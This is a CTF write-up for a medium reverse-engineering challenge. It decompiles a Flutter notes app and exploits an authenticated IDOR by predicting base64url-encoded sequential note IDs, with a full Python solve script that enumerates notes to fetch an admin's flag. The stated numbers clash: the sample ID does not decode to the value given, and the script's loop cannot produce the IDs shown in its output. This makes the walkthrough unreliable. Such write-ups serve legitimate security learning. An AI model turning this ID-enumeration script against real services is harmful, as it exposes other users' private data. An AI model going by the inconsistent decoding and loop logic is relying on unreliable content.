---
title: "Ghost Notes"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: reverse
difficulty: medium
points: 200
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Ghost Notes

## summary

flutter apk that swears every note lives behind its own unguessable link. blutter it -> thin REST wrapper, and the note ids are just base64url(4-byte LE int) counting up by 11111. auth'd IDOR, walk back to note 0 and the flag is note n=1.

## how i solved it

### 1. reverse the client

```bash
python3 blutter.py ghost-notes/lib/arm64-v8a out/
grep -rin 'http\|/api' out/pp.txt | head
```

```text
base = 'https://ghost-notes.chetanr25.in'
POST /api/register
POST /api/login      -> returns {token}, use Bearer
POST /api/notes      (create, auth)
GET  /api/notes      (list mine)
GET  /api/notes/<id> (auth, but no owner check -> IDOR)
```

### 2. figure out the ids

```python
import base64
id0='LhoAAA'  # id of a note i just created
v=int.from_bytes(base64.urlsafe_b64decode(id0+'=='),'little')
print('my note value',v)
```

```text
my note value 415960
# make two notes 10s apart -> they differ by exactly 11111
# so id value = base + 11111*n. counter is global, admin note is an early n.
```

### 3. walk back to the first notes

```text
value = base + 11111*n, encode back with base64url(LE)
binary-search down to the smallest valid id, then enumerate n=0,1,2...
```

```text
n=0 -> owner=admin title=welcome
n=1 -> owner=admin title=flag  <-- this one
```

## full solve script

```python
import base64, json, os, urllib.request, urllib.error
B='https://ghost-notes.chetanr25.in'
def req(method, path, tok=None, data=None):
    hdr={'Content-Type':'application/json'}
    if tok: hdr['Authorization']='Bearer '+tok
    body=json.dumps(data).encode() if data is not None else None
    r=urllib.request.Request(B+path, data=body, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp: return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()

# register + login
u='probe'+str(int.from_bytes(os.urandom(3),'big'))
req('POST','/api/register',data={'username':u,'password':'Pw!12345'})
_,lg=req('POST','/api/login',data={'username':u,'password':'Pw!12345'})
tok=json.loads(lg)['token']

# create a note to learn the current counter value
_,c=req('POST','/api/notes',tok,{'title':'probe','body':'probe'})
id0=json.loads(c)['id']
v0=int.from_bytes(base64.urlsafe_b64decode(id0+'=='),'little')
STEP=11111
enc=lambda v: base64.urlsafe_b64encode(v.to_bytes(4,'little')).decode().rstrip('=')

# base = smallest v0 - k*STEP that still resolves (note 0)
n=(v0)//STEP
for i in range(n+1):
    v=v0 - (n-i)*STEP
    st,body=req('GET','/api/notes/'+enc(v),tok)
    if st==200:
        j=json.loads(body)
        if j.get('owner')=='admin' and j.get('title')=='flag':
            print(j['body']); break
```

```text
GET /api/notes/AQAAAA -> {"id":"AQAAAA","owner":"admin","title":"welcome"}
GET /api/notes/aCsAAA -> {"id":"aCsAAA","owner":"admin","title":"flag","body":"pbctf{1d0r_by_pr3d1ct4bl3_1ds_1g}"}
pbctf{1d0r_by_pr3d1ct4bl3_1ds_1g}
```

## flag

```
pbctf{1d0r_by_pr3d1ct4bl3_1ds_1g}
```
